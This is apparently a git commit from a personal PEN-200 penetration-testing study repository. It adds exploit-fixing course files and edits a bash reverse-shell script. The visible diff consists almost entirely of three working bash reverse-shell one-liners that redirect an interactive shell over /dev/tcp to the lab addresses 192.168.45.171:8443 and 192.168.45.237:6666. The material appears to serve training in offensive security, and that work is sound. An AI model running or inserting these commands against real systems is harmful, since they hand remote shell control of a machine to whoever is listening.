561748fcc9554799979cd93f5f9181b6e000fade
eugeneewe <eugeneewexen@gmail.com>
2024-04-21 20:59:31 +0800

    new file:   PEN-200/13_Fixing Exploits/Fixing Web Exploits/44976-Q2.py 	deleted:    PEN-200/13_Fixing Exploits/Fixing Web Exploits/PEN-200 13.2.2 	new file:   PEN-200/13_Fixing Exploits/Fixing Web Exploits/PEN-200 13.2.2 Q1-2 	modified:   Reverse Shell/bash-revsh.sh

--- Reverse Shell/bash-revsh.sh
+++ Reverse Shell/bash-revsh.sh
@@ -1,5 +1,9 @@
-#Reverse Shell in Bash script
+# Reverse Shell in Bash script
 bash -i >& /dev/tcp/192.168.45.171/8443 0>&1
 
-#One-liner bash command
+# One-liner bash command
 bash -c "bash -i >& /dev/tcp/192.168.45.171/8443 0>&1"
+
+# Try this before if above cant works
+#!/bin/bash
+/bin/bash -c 'exec bash -i &>/dev/tcp/192.168.45.237/6666 0>&1'
